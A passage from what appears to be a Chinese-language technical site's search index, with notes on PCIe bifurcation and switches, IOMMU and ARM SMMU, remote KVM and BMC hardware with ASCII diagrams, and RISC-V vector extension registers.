\u200b\u63a5\u53e3\u200b\uff0c\u200b\u6839\u636e\u200b\u63d2\u200b\u5728\u200b\u4e3b\u677f\u200b\u4e0a\u200b\u7684\u200b\u8bbe\u5907\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4e3b\u677f\u200b\u81ea\u200b\u9002\u5e94\u200b\u51fa\u200b\u4e00\u4e2a\u200b PCIe Bifurcation \u200b\u914d\u7f6e\u200b\uff1b\u200b\u4e3b\u677f\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4ec0\u4e48\u200b\u90fd\u200b\u4e0d\u200b\u505a\u200b\uff0c\u200b\u76f4\u63a5\u200b\u628a\u200b CPU \u200b\u7684\u200b PCIe \u200b\u63a5\u5230\u200b Slot \u200b\u4e0a\u200b\uff0c\u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u7528\u6237\u200b\u81ea\u5df1\u200b\u8d2d\u4e70\u200b PCIe \u200b\u62c6\u5206\u200b\u5361\u200b\u3002\u200b\u6dd8\u5b9d\u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u641c\u200b\u5230\u200b\u4e0d\u5c11\u200b PCIe \u200b\u62c6\u5206\u200b\u5361\u200b\uff0c\u200b\u5176\u4e2d\u200b\u7528\u4e8e\u200b NVMe \u200b\u7684\u200b\u8f83\u200b\u591a\u200b\uff0c\u200b\u6bd5\u7adf\u200b M.2 \u200b\u63a5\u53e3\u200b\u9762\u79ef\u200b\u5c0f\u200b\uff0c\u200b\u800c\u4e14\u200b\u53ea\u200b\u9700\u8981\u200b PCIe x4\u3002</p> <p>\u200b\u53e6\u200b\u4e00\u79cd\u200b\u65b9\u6848\u200b\u662f\u200b PCIe \u200b\u4ea4\u6362\u673a\u200b\uff08\u200b\u5982\u200b PEX 8747\uff09\uff0c\u200b\u7f3a\u70b9\u200b\u662f\u200b\u6210\u672c\u200b\u8f83\u200b\u9ad8\u200b\uff0c\u200b\u589e\u52a0\u200b\u4e86\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u597d\u5904\u200b\u662f\u200b\u7075\u6d3b\u6027\u200b\u5f88\u5f3a\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b CPU \u200b\u989d\u5916\u200b\u914d\u7f6e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5916\u63a5\u200b\u66f4\u200b\u591a\u200b\u8bbe\u5907\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8bbe\u5907\u200b\u7a7a\u95f2\u200b\u65f6\u200b\u53ef\u4ee5\u200b\u8ba9\u51fa\u200b\u5e26\u5bbd\u200b\u3002\u200b\u4f8b\u5982\u200b\u4e00\u4e2a\u200b x16 \u200b\u4f7f\u7528\u200b Bifurcation \u200b\u65b9\u6cd5\u200b\u53ef\u4ee5\u200b\u62c6\u6210\u200b\u4e24\u4e2a\u200b x8\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b PCIe \u200b\u4ea4\u6362\u673a\u200b\u8fde\u63a5\u200b\u4e24\u4e2a\u200b x16\uff0c\u200b\u7c7b\u4f3c\u200b\u7f51\u7edc\u200b\uff0c\u200b\u8fd9\u200b\u4e24\u4e2a\u200b x16 \u200b\u5171\u4eab\u200b\u5e26\u5bbd\u200b\uff0c\u200b\u4e0b\u6e38\u200b\u7684\u200b\u4e24\u4e2a\u200b\u8bbe\u5907\u200b\u4e4b\u95f4\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u901a\u4fe1\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5728\u200b HPC \u200b\u573a\u666f\u200b\u4e0b\u4f1a\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4f7f\u7528\u200b PCIe \u200b\u4ea4\u6362\u673a\u200b\u8fde\u63a5\u200b\u663e\u5361\u200b\u548c\u200b IB \u200b\u7f51\u5361\u200b\u3002</p>"},{"location":"hardware/pcie.html#_9","title":"\u63a8\u8350\u200b\u9605\u8bfb","text":"<ul> <li>LogicJitterGibbs \u200b\u8d44\u6599\u200b\u6574\u7406\u200b\uff1a\u200b\u53ef\u4ee5\u200b\u5b66\u4e60\u200b 1W \u200b\u5c0f\u65f6\u200b\u7684\u200b PCIe</li> <li>intel \u200b\u90e8\u5206\u200b\u684c\u9762\u200b\u7ea7\u200b CPU \u200b\u7684\u200b pcie \u200b\u901a\u9053\u200b\u62c6\u5206\u200b\u53e6\u7c7b\u200b\u4f4e\u6210\u672c\u200b\u5b9e\u73b0\u200b</li> <li>Intel Alder Lake 12 \u200b\u4ee3\u9177\u200b\u777f\u200b CPU PCIe \u200b\u62c6\u5206\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b</li> </ul>"},{"location":"hardware/pcie.html#iommu","title":"IOMMU","text":"<p>IOMMU \u200b\u5728\u200b\u786c\u4ef6\u200b\u4e0a\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u5f0f\u200b\u7c7b\u4f3c\u200b CPU \u200b\u4e0a\u200b\u7684\u200b MMU\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u5bf9\u8c61\u200b\u662f\u200b PCIe \u200b\u8bbe\u5907\u200b\uff0c\u200b\u5f53\u200b PCIe \u200b\u8bbe\u5907\u200b\u5728\u200b\u53d1\u8d77\u200b\u5185\u5b58\u200b\u8bfb\u5199\u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u7ecf\u8fc7\u200b IOMMU\uff0cIOMMU \u200b\u6309\u7167\u200b\u9884\u5148\u200b\u914d\u7f6e\u200b\u597d\u200b\u7684\u200b\u8bbe\u5b9a\u200b\u8fdb\u884c\u200b\u5730\u5740\u200b\u8f6c\u6362\u200b\uff0c\u200b\u5982\u679c\u200b\u8f6c\u6362\u200b\u4e0d\u200b\u6210\u529f\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u62d2\u7edd\u8bf7\u6c42\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u5b89\u5168\u6027\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\u6709\u4e9b\u200b\u60c5\u51b5\u200b\u4e0b\u200b IOMMU \u200b\u4e0d\u80fd\u200b\u4fdd\u8bc1\u200b\u7ed9\u200b\u6bcf\u4e2a\u200b\u8bbe\u5907\u200b\u90fd\u200b\u5355\u72ec\u200b\u4e00\u4e2a\u200b\u5730\u5740\u200b\u8f6c\u6362\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u4e0d\u80fd\u200b\u4fdd\u8bc1\u200b\u628a\u200b\u6bcf\u4e2a\u200b\u8bbe\u5907\u200b\u7684\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u90fd\u200b\u9694\u79bb\u5f00\u200b\uff0c\u200b\u53ef\u80fd\u200b\u6709\u200b\u82e5\u5e72\u4e2a\u200b\u8bbe\u5907\u200b\u9700\u8981\u200b\u5171\u4eab\u200b\u540c\u4e00\u4e2a\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u6620\u5c04\u200b\u3002\u200b\u6b64\u65f6\u200b\u8fd9\u4e9b\u200b\u5171\u4eab\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u7684\u200b\u8bbe\u5907\u200b\u5c31\u200b\u7ec4\u6210\u200b\u4e00\u4e2a\u200b IOMMU Group\uff0cGroup \u200b\u5185\u200b\u7684\u200b\u8bbe\u5907\u200b\u4e0d\u200b\u9694\u79bb\u200b\uff0cGroup \u200b\u4e4b\u95f4\u200b\u9694\u79bb\u200b\u3002</p> <p>\u200b\u5404\u200b\u5e73\u53f0\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u81ea\u5df1\u200b\u7684\u200b IOMMU \u200b\u6807\u51c6\u200b\uff1a</p> <ul> <li>AMD I/O Virtualization Technology (IOMMU) Specification</li> <li>Intel VT-d</li> <li>ARM SMMU v3</li> </ul> <p>\u200b\u4ee5\u200b ARM SMMU \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5b83\u200b\u5728\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u89c1\u200b\u4e0b\u56fe\u200b\uff1a</p> <p> </p> SMMU\uff08\u200b\u56fe\u6e90\u200b ARM IHI 0070 F.a\uff09 <p>\u200b\u56fe\u4e2d\u200b\u4e0a\u534a\u200b\u90e8\u5206\u200b\u5bf9\u5e94\u200b\u7684\u200b\u662f\u200b\u7247\u200b\u4e0a\u200b\u603b\u7ebf\u200b\uff0c\u200b\u4f8b\u5982\u200b AXI\uff1b\u200b\u4e0b\u200b\u534a\u200b\u90e8\u5206\u200b\u5bf9\u5e94\u200b\u7684\u200b\u662f\u200b PCIe\u3002\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u4ece\u200b\u5904\u7406\u5668\u200b\uff08PE\uff09\u200b\u5230\u200b\u5916\u8bbe\u200b\uff08Device/EP\uff09\u200b\u7684\u200b\u6d41\u91cf\u200b\u662f\u200b\u4e0d\u4f1a\u200b\u7ecf\u8fc7\u200b SMMU \u200b\u7ffb\u8bd1\u200b\u7684\u200b\uff0c\u200b\u800c\u200b\u53ea\u6709\u200b\u5f53\u200b\u5916\u8bbe\u200b\u8981\u200b\u8bbf\u95ee\u200b\u5185\u5b58\u200b\uff08Memory\uff09\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5b83\u4f1a\u200b\u7ecf\u8fc7\u200b SMMU \u200b\u8fdb\u884c\u200b\u5730\u5740\u200b\u8f6c\u6362\u200b\uff0c\u200b\u7528\u200b\u8f6c\u6362\u200b\u540e\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b\u8bbf\u95ee\u200b\u5185\u5b58\u200b\u3002</p>"},{"location":"hardware/remote_kvm.html","title":"\u8fdc\u7a0b\u200b KVM","text":"<p>\u200b\u8fdc\u7a0b\u200b KVM \u200b\u662f\u200b\u6307\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u7f51\u7edc\u200b\u8fdc\u7a0b\u200b\u5730\u200b\u63a7\u5236\u200b\u673a\u5668\u200b\uff0c\u200b\u5305\u62ec\u200b\u952e\u76d8\u200b\uff08Keyboard\uff09\u3001\u200b\u89c6\u9891\u200b\uff08Video\uff09\u200b\u548c\u200b\u9f20\u6807\u200b\uff08Mouse\uff09\uff0c\u200b\u4e09\u4e2a\u200b\u5355\u8bcd\u200b\u7684\u200b\u9996\u5b57\u6bcd\u200b\u8fde\u200b\u8d77\u6765\u200b\u5c31\u662f\u200b KVM\u3002\u200b\u6b64\u5916\u200b\uff0c\u200b\u5b83\u200b\u8fd8\u200b\u901a\u5e38\u200b\u652f\u6301\u200b\u8fdc\u7a0b\u200b\u5f00\u5173\u673a\u200b\u3001\u200b\u6302\u8f7d\u200b\u865a\u62df\u200b\u78c1\u76d8\u200b\u7b49\u200b\u529f\u80fd\u200b\u3002\u200b\u5b83\u200b\u89e3\u51b3\u200b\u4e86\u200b\u8fdc\u7a0b\u200b\u673a\u5668\u200b\u8fd0\u7ef4\u200b\u7684\u200b\u95ee\u9898\u200b\u3002\u200b\u5728\u200b\u6ca1\u6709\u200b\u8fdc\u7a0b\u200b KVM \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u5bf9\u200b\u673a\u5668\u200b\u8fdb\u884c\u200b\u8fd0\u7ef4\u200b\uff0c\u200b\u901a\u5e38\u200b\u9700\u8981\u200b\uff1a</p> <ol> <li>\u200b\u7ef4\u62a4\u200b\u4eba\u5458\u200b\u7ebf\u4e0b\u200b\u63a5\u89e6\u200b\u5230\u200b\u673a\u5668\u200b</li> <li>\u200b\u628a\u200b\u673a\u5668\u200b\u8fde\u63a5\u200b\u5230\u200b\u952e\u76d8\u200b\u3001\u200b\u9f20\u6807\u200b\u548c\u200b\u663e\u793a\u5668\u200b</li> </ol> <pre><code>+----------+\n| Machine  |\n+----------+\n  |  |  |\n  |  |  \\--USB--Keyboard\n  |  |\n  |  \\------USB--Mouse\n  |\n  \\---------HDMI-Monitor\n</code></pre> <p>\u200b\u5982\u679c\u200b\u673a\u5668\u200b\u5f88\u591a\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u51cf\u5c11\u200b\u6765\u56de\u200b\u7684\u200b\u63d2\u62d4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b\u786c\u4ef6\u200b\u7684\u200b KVM \u200b\u5207\u6362\u5668\u200b\uff1a\u200b\u5b83\u200b\u652f\u6301\u200b\u591a\u8def\u200b\u8f93\u5165\u200b\u548c\u200b\u4e00\u8def\u200b\u8f93\u51fa\u200b\uff0c\u200b\u6bcf\u200b\u4e00\u8def\u200b\u7684\u200b\u8f93\u5165\u200b\u6216\u200b\u8f93\u51fa\u200b\uff0c\u200b\u901a\u5e38\u200b\u90fd\u200b\u5305\u62ec\u200b\u89c6\u9891\u200b\uff08Video\uff0c\u200b\u4f8b\u5982\u200b HDMI \u200b\u6216\u200b VGA \u200b\u63a5\u53e3\u200b\uff09\u200b\u548c\u200b USB\uff08\u200b\u7528\u4e8e\u200b Keyboard \u200b\u548c\u200b Mouse\uff09\u3002KVM \u200b\u5207\u6362\u5668\u200b\u901a\u5e38\u200b\u6709\u200b\u6309\u94ae\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u591a\u8def\u200b\u8f93\u5165\u200b\u4e2d\u200b\u5207\u6362\u200b\u3002</p> <pre><code>  HDMI Input 1\n  | USB Input 1\n  | | HDMI Input 2\n  | | | USB Input 2\n  | | | | HDMI Input 3\n  | | | | | USB Input 3\n  | | | | | |\n  | | | | | |\n+-------------+\n| KVM Switch  |\n+-------------+\n  | | |\n  | | USB Output (for Mouse)\n  | USB Output (for Keyboard)\n  HDMI Output\n</code></pre> <p>\u200b\u4f8b\u5982\u200b\uff0c\u200b\u6709\u200b\u4e09\u53f0\u200b\u673a\u5668\u200b\u7ecf\u5e38\u200b\u9700\u8981\u200b\u8fd0\u7ef4\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b\u6765\u56de\u200b\u7684\u200b\u63d2\u62d4\u200b\uff0c\u200b\u8d2d\u4e70\u200b\u4e00\u4e2a\u200b\u4e09\u200b\u8f93\u5165\u200b\u7684\u200b KVM \u200b\u5207\u6362\u5668\u200b\uff0c\u200b\u628a\u200b\u4e09\u53f0\u200b\u673a\u5668\u200b\u7684\u200b HDMI \u200b\u548c\u200b USB \u200b\u5206\u522b\u200b\u63a5\u5230\u200b KVM \u200b\u5207\u6362\u5668\u200b\u7684\u200b\u4e09\u8def\u200b\u8f93\u5165\u200b\uff0c\u200b\u518d\u200b\u628a\u200b KVM \u200b\u5207\u6362\u5668\u200b\u7684\u200b\u8f93\u51fa\u200b\u8fde\u63a5\u200b\u5230\u200b\u663e\u793a\u5668\u200b\u4e0a\u200b\uff0c\u200b\u518d\u200b\u628a\u200b USB \u200b\u952e\u76d8\u200b\u548c\u200b\u9f20\u6807\u200b\u63d2\u200b\u5230\u200b KVM \u200b\u5207\u6362\u5668\u200b\u7684\u200b\u8f93\u51fa\u200b\u7aef\u200b\u3002\u200b\u6b64\u65f6\u200b\uff0c\u200b\u901a\u8fc7\u200b KVM \u200b\u5207\u6362\u5668\u200b\u7684\u200b\u6309\u94ae\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5207\u6362\u200b\u5230\u200b\u5177\u4f53\u200b\u7684\u200b\u67d0\u200b\u4e00\u53f0\u200b\u673a\u5668\u200b\uff1a\u200b\u5982\u679c\u200b\u5207\u6362\u200b\u5230\u200b\u7b2c\u4e00\u53f0\u200b\u673a\u5668\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u76f8\u5f53\u4e8e\u200b\u628a\u200b\u7b2c\u4e00\u53f0\u200b\u673a\u5668\u200b\u7684\u200b HDMI \u200b\u8f93\u51fa\u200b\u63a5\u5230\u200b\u663e\u793a\u5668\u200b\u4e0a\u200b\uff0c\u200b\u540c\u65f6\u200b\u628a\u200b USB \u200b\u952e\u76d8\u200b\u548c\u200b\u9f20\u6807\u200b\u63a5\u5230\u200b\u7b2c\u4e00\u53f0\u200b\u673a\u5668\u200b\u4e0a\u200b\u3002\u200b\u90a3\u4e48\u200b\u5982\u679c\u200b\u8981\u200b\u5bf9\u200b\u7b2c\u4e8c\u53f0\u200b\u673a\u5668\u200b\u8fdb\u884c\u200b\u8fd0\u7ef4\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u901a\u8fc7\u200b KVM \u200b\u5207\u6362\u5668\u200b\u7684\u200b\u6309\u94ae\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5b8c\u6210\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u63d2\u62d4\u200b HDMI \u200b\u6216\u8005\u200b USB \u200b\u7ebf\u200b\u3002</p> <pre><code>+------------+   +------------+   +------------+\n| Machine  1 |   | Machine 2  |   | Machine 3  |\n+------------+   +------------+   +------------+\n  |       |        |       |        |       |\n  | HDMI  | USB    | HDMI  | USB    | HDMI  | USB\n  |  #1   |  #1    |  #2   |  #2    |  #3   |  #3\n+-----------------------------------------------+\n| KVM Switch                           [Button] |\n+-----------------------------------------------+\n  | | |\n  | | \\--USB--Mouse\n  | \\----USB--Keyboard\n  \\------HDMI-Monitor\n</code></pre> <p>KVM \u200b\u5207\u6362\u5668\u200b\u867d\u7136\u200b\u89e3\u51b3\u200b\u4e86\u200b\u63d2\u62d4\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f46\u200b\u7ef4\u62a4\u200b\u4eba\u5458\u200b\u8fd8\u662f\u200b\u9700\u8981\u200b\u5230\u200b\u673a\u5668\u200b\u6240\u5728\u200b\u7684\u200b\u5730\u65b9\u200b\uff0c\u200b\u4e0d\u80fd\u200b\u8fdc\u7a0b\u200b\u64cd\u4f5c\u200b\u3002\u200b\u800c\u200b\u8fdc\u7a0b\u200b KVM \u200b\u89e3\u51b3\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff1a</p> <pre><code>+------------+\n| Machine 1  |\n+------------+\n  |       |\n  | HDMI  | USB\n  |  #1   |  #1\n+------------+\n| Remote KVM |\n+------------+\n  |\n  | Network\n  |\n+------------+\n| Operator   |\n+------------+\n</code></pre> <p>\u200b\u8fd0\u7ef4\u200b\u4eba\u5458\u200b\u901a\u8fc7\u200b\u7f51\u7edc\u200b\u8bbf\u95ee\u200b\u8fdc\u7a0b\u200b KVM\uff0c\u200b\u800c\u200b\u8fdc\u7a0b\u200b KVM \u200b\u901a\u8fc7\u200b HDMI \u200b\u548c\u200b USB \u200b\u8fde\u63a5\u200b\u5230\u200b\u673a\u5668\u200b\u4e0a\u200b\u3002\u200b\u4e3a\u4e86\u200b\u8ba9\u200b\u8fd0\u7ef4\u200b\u4eba\u5458\u200b\u53ef\u4ee5\u200b\u8fdc\u7a0b\u200b\u64cd\u63a7\u200b\u673a\u5668\u200b\uff0c\u200b\u8fdc\u7a0b\u200b KVM \u200b\u901a\u5e38\u200b\u4f1a\u200b\u63d0\u4f9b\u200b\u4e00\u4e2a\u200b\u7f51\u9875\u200b\uff0c\u200b\u5728\u200b\u7f51\u9875\u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u89c2\u770b\u200b\u673a\u5668\u200b\u7684\u200b HDMI \u200b\u663e\u793a\u200b\u8f93\u51fa\u200b\uff0c\u200b\u8fd0\u7ef4\u200b\u4eba\u5458\u200b\u901a\u8fc7\u200b\u7f51\u9875\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u64cd\u4f5c\u200b\u9f20\u6807\u200b\uff0c\u200b\u952e\u76d8\u200b\u6309\u952e\u200b\u4e5f\u200b\u4f1a\u200b\u88ab\u200b\u4f20\u8f93\u200b\u5230\u200b\u673a\u5668\u200b\u4e0a\u200b\u3002\u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\uff0c\u200b\u8fdc\u7a0b\u200b KVM \u200b\u5185\u7f6e\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u91c7\u96c6\u200b\u82af\u7247\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u628a\u200b HDMI \u200b\u7684\u200b\u8f93\u51fa\u200b\u8f6c\u5316\u200b\u4e3a\u200b\u6570\u5b57\u4fe1\u53f7\u200b\uff0c\u200b\u901a\u8fc7\u200b\u89c6\u9891\u200b\u7f16\u7801\u200b\uff0c\u200b\u4ee5\u200b\u89c6\u9891\u6d41\u200b\u7684\u200b\u65b9\u5f0f\u200b\u4f20\u8f93\u200b\u5230\u200b\u8fd0\u7ef4\u200b\u4eba\u5458\u200b\u64cd\u4f5c\u200b\u7684\u200b\u6d4f\u89c8\u5668\u200b\u91cc\u200b\uff1b\u200b\u540c\u65f6\u200b\u8fdc\u7a0b\u200b KVM \u200b\u53ef\u4ee5\u200b\u6a21\u62df\u200b USB \u200b\u8bbe\u5907\u200b\uff1a\u200b\u9f20\u6807\u200b\u3001\u200b\u952e\u76d8\u200b\u548c\u200b U \u200b\u76d8\u200b\u7b49\u200b\uff0c\u200b\u4ece\u800c\u200b\u5b9e\u73b0\u200b\u8fdc\u7a0b\u200b\u7684\u200b\u9f20\u6807\u200b\u952e\u76d8\u200b\u64cd\u63a7\u200b\u548c\u200b\u865a\u62df\u200b\u955c\u50cf\u200b\u7684\u200b\u6302\u8f7d\u200b\u3002</p> <p>\u200b\u5728\u200b\u5f88\u591a\u200b\u670d\u52a1\u5668\u200b\u4e2d\u200b\uff0cBMC\uff08Board Management Controller\uff09\u200b\u5185\u7f6e\u200b\u4e86\u200b\u8fdc\u7a0b\u200b KVM \u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u5b83\u200b\u548c\u200b\u673a\u5668\u200b\u7684\u200b\u96c6\u6210\u200b\u7a0b\u5ea6\u200b\u66f4\u6df1\u200b\uff1a\u200b\u5b83\u200b\u901a\u5e38\u200b\u662f\u200b\u901a\u8fc7\u200b PCIe \u200b\u7684\u200b\u65b9\u5f0f\u200b\u8fde\u63a5\u200b\u670d\u52a1\u5668\u200b\u7684\u200b CPU\uff0c\u200b\u901a\u8fc7\u200b PCIe \u200b\u865a\u62df\u200b\u51fa\u200b\u663e\u5361\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u663e\u5361\u200b\u7684\u200b\u8f93\u51fa\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u88ab\u200b BMC \u200b\u91c7\u96c6\u200b\u5230\u200b\uff0c\u200b\u4e0d\u518d\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u7684\u200b\u91c7\u96c6\u200b\u82af\u7247\u200b\u3002\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b BMC\uff0c\u200b\u5219\u200b\u53ef\u4ee5\u200b\u8d2d\u4e70\u200b\u4e00\u4e9b\u200b\u8fdc\u7a0b\u200b KVM \u200b\u7684\u200b\u6269\u5c55\u5361\u200b\uff0c\u200b\u6765\u200b\u63d0\u4f9b\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li>PiKVM</li> <li>NanoKVM</li> <li>BliKVM</li> </ul>"},{"location":"hardware/rvv.html","title":"RISC-V Vector (RVV) Extension","text":"<p>\u200b\u89c4\u8303\u200b\uff1ariscvarchive/riscv-v-spec</p> <p>PPT\uff1a</p> <ul> <li>RISC-V Vector Extension Webinar I</li> <li>RISC-V Vector Extension Webinar II</li> <li>RISC-V Vector Extension Webinar III</li> </ul>"},{"location":"hardware/rvv.html#_1","title":"\u6982\u5ff5","text":"<ul> <li>VLEN: \u200b\u6bcf\u4e2a\u200b\u5411\u91cf\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u5bbd\u5ea6\u200b\uff0c\u200b\u5355\u4f4d\u200b\u662f\u200b bit</li> <li>SEW(Selected Element Width): \u200b\u5f53\u524d\u200b\u7684\u200b\u5143\u7d20\u200b\u5bbd\u5ea6\u200b\uff0c\u200b\u5355\u4f4d\u200b\u662f\u200b bit\uff0c\u200b\u53d6\u503c\u200b 8/16/32/64</li> <li>ELEN: \u200b\u652f\u6301\u200b\u7684\u200b SEW \u200b\u7684\u200b\u6700\u5927\u503c\u200b</li> <li>LMUL: Vector register group multiplier\uff0c\u200b\u628a\u200b\u4e00\u5230\u200b\u591a\u4e2a\u200b\u7684\u200b\u5411\u91cf\u200b\u5bc4\u5b58\u5668\u200b\u7ed1\u200b\u5728\u200b\u4e00\u8d77\u200b\u5f53\u6210\u200b\u4e00\u4e2a\u200b\u5411\u91cf\u200b\u5bc4\u5b58\u5668\u200b\u6765\u200b\u7528\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u662f\u200b\u6574\u6570\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u662f\u200b\u5206\u6570\u200b\uff0c\u200b\u53d6\u503c\u200b 1/8, 1/4, 1/2, 1, 2, 4, 8</li> <li>VLMAX: \u200b\u6700\u5927\u200b\u7684\u200b\u5143\u7d20\u200b\u4e2a\u6570\u200b\uff1a<code>LMUL*VLEN/SEW</code></li> <li>EEW: effective element width\uff0c\u200b\u9ed8\u8ba4\u200b\u662f\u200b SEW\uff0c\u200b\u4f46\u200b\u5982\u679c\u200b\u6307\u4ee4\u200b\u81ea\u5e26\u200b\u4e86\u200b\u5bbd\u5ea6\u200b\uff0cEEW \u200b\u53ef\u80fd\u200b\u548c\u200b SEW \u200b\u4e0d\u540c\u200b</li> <li>EMUL: effective LMUL\uff0c\u200b\u9ed8\u8ba4\u200b\u662f\u200b LMUL\uff0c\u200b\u4f46\u200b\u5982\u679c\u200b EEW \u200b\u548c\u200b SEW \u200b\u4e0d\u540c\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b EEW/EMUL=SEW/LMUL \u200b\u5f97\u5230\u200b EMUL \u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u8fd9\u6837\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u5143\u7d20\u200b\u4e2a\u6570\u200b\u662f\u200b\u4e0d\u53d8\u200b\u7684\u200b</li> <li>Mask: v0 \u200b\u4f5c\u4e3a\u200b\u53ef\u9009\u200b\u7684\u200b mask \u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u6bcf\u4e2a\u200b bit \u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b element</li> </ul>"},{"location":"hardware/rvv.html#csr","title":"CSR","text":"<ul> <li>mstatus/vsstatus: \u200b\u548c\u200b\u6d6e\u70b9\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u7528\u6765\u200b\u542f\u7528\u200b/\u200b\u5173\u95ed\u200b RVV\uff0c\u200b\u65b9\u4fbf\u200b\u4e0a\u4e0b\u6587\u200b\u5207\u6362\u200b</li> <li>vtype: \u200b\u6700\u200b\u4e3b\u8981\u200b\u7684\u200b rvv \u200b\u72b6\u6001\u200b\uff0c\u200b\u901a\u8fc7\u200b <code>vset{i}vl{i}</code> \u200b\u6307\u4ee4\u200b\u8bbe\u7f6e\u200b\uff0c\u200b\u5305\u62ec\u200b\u5982\u4e0b\u200b\u5b57\u200b\u6bb5\u200b\uff1a<ul> <li>vill: illegal\uff0c\u200b\u7528\u6765\u200b\u68c0\u6d4b\u200b\u4e0d\u200b\u5408\u6cd5\u200b\u7684\u200b vtype</li> <li>vma: \u200b\u8bbe\u7f6e\u200b\u6ca1\u6709\u200b\u88ab\u200b mask enable \u200b\u7684\u200b\u90e8\u5206\u200b\u600e\u4e48\u200b\u5904\u7406\u200b\uff1aundisturbed\uff08\u200b\u4e0d\u53d8\u200b\uff09\u200b\u6216\u200b agnostic\uff08\u200b\u786c\u4ef6\u200b\u51b3\u5b9a\u200b\u4e0d\u53d8\u200b\u6216\u8005\u200b\u5199\u200b\u4e3a\u200b\u5168\u200b 1\uff09</li> <li>vta\uff1a\u200b\u8bbe\u7f6e\u200b\u6ca1\u6709\u200b\u88ab\u200b vl \u200b\u8986\u76d6\u200b\u7684\u200b\u90e8\u5206\u200b\u600e\u4e48\u200b\u5904\u7406\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b undisturbed \u200b\u6216\u200b agnostic</li> <li>vsew\uff1a\u200b\u8bbe\u7f6e\u200b SEW</li> <li>vlmul\uff1a\u200b\u8bbe\u7f6e\u200b LMUL</li> </ul> </li> <li>vl: \u200b\u5f53\u524d\u200b\u7684\u200b\u5411\u91cf\u200b\u5bc4\u5b58\u5668\u200b\u957f\u5ea6\u200b\uff0c\u200b\u901a\u8fc7\u200b <code>vset{i}vl{i}</code> \u200b\u6307\u4ee4\u200b\u8bbe\u7f6e\u200b\uff0c\u200b\u5355\u4f4d\u200b\u662f\u200b\u5143\u7d20\u200b\u4e2a\u6570\u200b\uff0c\u200b\u6700\u5927\u503c\u200b\u662f\u200b VLMAX</li> <li>vlenb: \u200b\u4fdd\u5b58\u200b\u4e86\u200b VLEN/8</li> <li>vstart\uff1a\u200b\u6267\u884c\u200b\u65f6\u200b\u8df3\u200b\u8fc7\u200b\u5f00\u5934\u200b\u7684\u200b\u4e00\u4e9b\u200b\u5143\u7d20\u200b\uff0c\u200b\u7528\u4e8e\u200b load/store 